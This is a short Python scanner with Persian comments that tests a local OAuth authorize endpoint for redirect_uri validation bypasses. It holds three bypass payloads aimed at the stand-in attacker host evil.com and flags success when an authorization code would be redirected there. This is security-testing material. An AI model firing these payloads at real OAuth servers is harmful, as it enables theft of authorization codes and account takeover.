import requests

def scan_oauth(url_base, client_id):
    print(f"[*] Testing OAuth redirect_uri bypass on: {url_base}")
    
    # پیلودهای مختلف برای دور زدن چک کردن redirect_uri
    payloads = [
        "http://localhost:8000.evil.com",  # ساب‌دامین جعلی
        "http://evil.com?localhost:8000",  # پارامتر اضافه
        "http://localhost:8000@evil.com"   # ترفند @ (یوزرنیم در URL)
    ]
    
    for payload in payloads:
        target_url = f"{url_base}?client_id={client_id}&redirect_uri={payload}"
        try:
            # خیلی مهم: allow_redirects=False تا بفهمیم به کجا ریدایرکت میشه
            r = requests.get(target_url, allow_redirects=False, timeout=3)
            
            if r.status_code in [301, 302]:
                location = r.headers.get('Location', '')
                print(f"    [>] Payload: {payload}")
                print(f"    [<] Redirected to: {location}")
                
                # اگه دیدیم به evil.com ریدایرکت شد، یعنی باگ داره
                if "evil.com" in location:
                    print(f"\n[+] CRITICAL: OAuth redirect_uri Bypass Found!")
                    print(f"    The authorization code was leaked to evil.com\n")
                    return
        except Exception as e:
            pass
            
    print("[-] OAuth redirect_uri seems secure.")

if __name__ == "__main__":
    target = "http://127.0.0.1:8000/oauth/authorize"
    client_id = "test_app"
    scan_oauth(target, client_id)
